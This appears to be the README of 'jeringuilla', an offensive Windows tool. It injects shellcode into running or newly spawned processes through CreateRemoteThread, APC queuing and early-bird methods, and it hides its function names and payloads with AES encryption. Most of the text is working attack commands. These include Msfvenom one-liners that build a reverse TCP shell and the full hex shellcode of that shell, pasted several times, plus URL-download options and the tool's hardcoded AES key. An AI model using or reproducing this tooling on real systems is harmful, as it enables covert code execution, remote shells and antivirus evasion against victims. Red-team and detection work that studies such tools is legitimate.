# jeringuilla

Tool for easy process injection. It implements several types of process injection and uses dynamic function loading using delegates and AES to encrypt all the strings, so the function names are not easiliy retrievable.
- Process listing: By process name or process owner
- Payload: As input argument or using a url to download it. It can be AES-encrypted using payloadEncryptor.exe
- Process injection via:
    - Type "inject-crt": OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    - Type "inject-apc": OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC 
    - Type "earlybird":  CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread


--------------------------------------

### List process

Option "list" to enumerate all processes or filter by name or owner:

```
jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER]
```

Example - List all processes:

```
jeringuilla.exe list all
```

Example - List processes with a specific name ("explorer") or process owner ("DESKTOP-MA54241\ricardo"):

```
jeringuilla.exe list explorer
jeringuilla.exe list "DESKTOP-MA54241\ricardo"
```
![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_1.png)

--------------------------------------

###  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.

```
jeringuilla.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
```

Example - Injection using process name, process owner and payload in HEX format:

```
jeringuilla.exe inject-crt explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_2.png)

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_5.png)

Example - Injection using PID ("1234") and a url to download the payload:

```
jeringuilla.exe inject-crt 1234 http://127.0.0.1/payload.bin
```
![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_3.png)

--------------------------------------

###  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url. 

For this one you must wait until the thread enters in alertable state, you can try it using Notepad and the option "Save as".

```
jeringuilla.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
```

Example - Injection using process name, process owner and payload in HEX format:

```
jeringuilla.exe inject-apc explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

Example - Injection using PID ("1234") and a url to download the payload:

```
jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
```


--------------------------------------

###  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)

You only set the program path. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.

```
jeringuilla.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]
```

Example - Injection using program path and payload in HEX format:

```
jeringuilla.exe earlybird "c:\windows\system32\notepad.exe" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_4.png)

Example - Injection using program path and a url to download the payload:

```
jeringuilla.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payload.bin
```

--------------------------------------

### Payload generation

You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in RAW format.

Example - Create payload in HEX format using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\x' | tr -d '"\n\\x;'
```

Example - Create payload in RAW format for url option using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin
```

--------------------------------------

### AES Encryption

Both the HEX and RAW payloads in previous examples can be encrypted using AES with payloadEncryptor.exe. 

To change the AES password and IV you must update these variables in both jeringuilla and payloadEncryptor code:

```
static String payload_aes_password = "ricardojoserf123ricardojoserf123
static String payload_aes_iv = "jeringa1jeringa1";
``` 

To encrypt a HEX payload:

```
payloadEncryptor.exe hex HEXADECIMAL_PAYLOAD
```

Example:

```
payloadEncryptor.exe hex fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_6.png)

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_7.png)


To encrypt a RAW payload:

```
payloadEncryptor.exe raw INPUTFILE OUTPUTFILE
```

Example:

```
payloadEncryptor.exe raw payload.bin payload_encrypted.bin
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_8.png)

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_9.png)
